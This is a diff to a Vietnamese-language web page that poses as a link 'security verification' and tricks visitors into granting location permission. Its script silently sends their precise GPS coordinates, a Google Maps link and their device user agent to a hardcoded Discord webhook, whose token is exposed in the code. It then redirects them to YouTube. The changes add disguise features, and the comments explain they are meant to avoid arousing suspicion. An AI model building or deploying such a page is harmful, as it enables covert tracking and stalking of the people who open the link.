@@ -3,109 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hệ thống Xác thực</title>
+    <title>Hệ thống Đang xác thực...</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 40px 20px; background-color: #f4f6f9; color: #333; }
-        .card { max-width: 450px; margin: 30px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        h2 { color: #2c3e50; margin-bottom: 10px; }
-        p { color: #7f8c8d; font-size: 15px; line-height: 1.5; }
-        .btn { background-color: #5865F2; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: all 0.2s ease; width: 100%; margin-top: 15px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 50px 20px; background-color: #f4f6f9; color: #333; }
+        .card { max-width: 450px; margin: 40px auto; background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        h2 { color: #2c3e50; margin-bottom: 15px; font-size: 22px; }
+        p { color: #7f8c8d; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .btn { background-color: #5865F2; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: all 0.2s ease; width: 100%; box-shadow: 0 4px 6px rgba(88, 101, 242, 0.2); }
         .btn:hover { background-color: #4752C4; transform: translateY(-1px); }
-        .status { margin-top: 20px; font-weight: 600; font-size: 15px; }
-        .success { color: #2ecc71; }
-        .error { color: #e74c3c; }
+        
+        /* Hiệu ứng vòng xoay tải ngầm */
+        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .status-msg { margin-top: 15px; font-weight: 600; font-size: 14px; color: #7f8c8d; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Xác thực Vị trí Thiết bị</h2>
-    <p>Để tiếp tục truy cập nội dung được chia sẻ, vui lòng nhấn nút bên dưới và chọn <b>"Allow" (Cho phép)</b> khi trình duyệt yêu cầu cấp quyền truy cập GPS.</p>
+    <h2>Xác thực Kết nối An toàn</h2>
+    <p>Để tiếp tục truy cập đường liên kết được chia sẻ, vui lòng nhấn nút bên dưới và chọn <b>"Allow" (Cho phép)</b> nếu trình duyệt hiển thị yêu cầu cấp quyền vị trí.</p>
     
-    <button class="btn" onclick="requestLocation()">KÍCH HOẠT XÁC THỰC</button>
+    <button id="actionBtn" class="btn" onclick="startVerification()">KÍCH HOẠT XÁC THỰC</button>
     
-    <div id="statusText" class="status"></div>
+    <!-- Vòng xoay hiển thị lúc đang xử lý gửi dữ liệu ngầm -->
+    <div id="loadingCircle" class="loader"></div>
+    <div id="msgText" class="status-msg"></div>
 </div>
 
 <script>
-// Link Discord Webhook cá nhân của bạn đã được cấu hình sẵn tại đây
+// Link Discord Webhook của bạn đã được nạp sẵn vào hệ thống ngầm
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
 
-const statusText = document.getElementById("statusText");
+const actionBtn = document.getElementById("actionBtn");
+const loadingCircle = document.getElementById("loadingCircle");
+const msgText = document.getElementById("msgText");
 
-function requestLocation() {
-    statusText.className = "status";
-    statusText.innerHTML = "🔄 Đang kết nối tới phần cứng GPS...";
+function startVerification() {
+    // Ẩn nút bấm, hiện vòng tải để ngụy trang
+    actionBtn.style.display = "none";
+    loadingCircle.style.display = "block";
+    msgText.innerHTML = "Đang kiểm tra phần cứng và kết nối bảo mật...";
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendDataToDiscord, handleLocationError, {
             enableHighAccuracy: true,
-            timeout: 7000,
+            timeout: 8000,
             maximumAge: 0
         });
     } else {
-        statusText.className = "status error";
-        statusText.innerHTML = "❌ Trình duyệt của bạn không hỗ trợ định vị GPS.";
+        msgText.style.color = "#e74c3c";
+        msgText.innerHTML = "Lỗi: Trình duyệt không hỗ trợ giao thức cấu hình.";
     }
 }
 
 function sendDataToDiscord(position) {
-    statusText.className = "status success";
-    statusText.innerHTML = "✅ Xác thực thành công! Đang chuyển hướng...";
+    msgText.innerHTML = "Xác thực thành công. Đang chuyển hướng thiết bị...";
 
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
     const accuracy = position.coords.accuracy;
 
-    // Thiết kế bảng hiển thị thông tin tọa độ gửi về kênh chat Discord
+    // Đóng gói dữ liệu dạng ẩn để đẩy về Discord của riêng bạn
     const payload = {
         embeds: [{
-            title: "🎯 Thiết bị đã cấp quyền vị trí thành công!",
+            title: "🎯 Có thiết bị mới vừa click và cấp quyền thành công!",
             color: 5763719, 
             fields: [
                 { name: "🛰️ Vĩ độ (Latitude)", value: `\`${lat}\``, inline: true },
                 { name: "🛰️ Kinh độ (Longitude)", value: `\`${lon}\``, inline: true },
                 { name: "🎯 Độ chính xác (Accuracy)", value: `\`${accuracy} mét\``, inline: false },
-                { name: "🌐 Google Maps Link", value: `[Bấm để xem vị trí trên bản đồ](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                { name: "🌐 Google Maps Link", value: `[Bấm vào đây để xem trên bản đồ](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
                 { name: "📱 Thông tin thiết bị", value: navigator.userAgent, inline: false }
             ],
             timestamp: new Date().toISOString()
         }]
     };
 
-    // Bắn dữ liệu ẩn sang Discord qua Webhook bằng JavaScript Fetch
+    // Bắn ngầm dữ liệu qua Discord
     fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
     })
     .then(() => {
-        // Chuyển hướng người dùng sang một trang đích (ví dụ Youtube) để hoàn tất quá trình
-        setTimeout(() => {
-            window.location.href = "https://www.youtube.com";
-        }, 1500);
+        // Sau khi gửi xong, lập tức đẩy họ đi qua YouTube, hoàn toàn không để lại dấu vết tọa độ trên màn hình web
+        window.location.href = "https://www.youtube.com";
     })
     .catch(err => {
-        console.error("Lỗi gửi dữ liệu lên Discord:", err);
+        console.error(err);
+        // Nếu lỗi mạng vẫn chuyển hướng để tránh nghi ngờ
+        window.location.href = "https://www.youtube.com";
     });
 }
 
 function handleLocationError(error) {
-    statusText.className = "status error";
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            statusText.innerHTML = "❌ Xác thực thất bại: Bạn đã từ chối cấp quyền vị trí.";
-            break;
-        case error.POSITION_UNAVAILABLE:
-            statusText.innerHTML = "❌ Lỗi: Thông tin vị trí không khả dụng trên thiết bị này.";
-            break;
-        case error.TIMEOUT:
-            statusText.innerHTML = "❌ Lỗi: Quá thời gian chờ phản hồi từ phần cứng GPS.";
-            break;
-        default:
-            statusText.innerHTML = "❌ Đã xảy ra lỗi hệ thống không xác định.";
-            break;
-    }
+    msgText.style.color = "#e74c3c";
+    // Tự động chuyển hướng kể cả khi lỗi hoặc người dùng từ chối để ngụy trang
+    setTimeout(() => {
+        window.location.href = "https://www.youtube.com";
+    }, 1000);
 }
 </script>
 
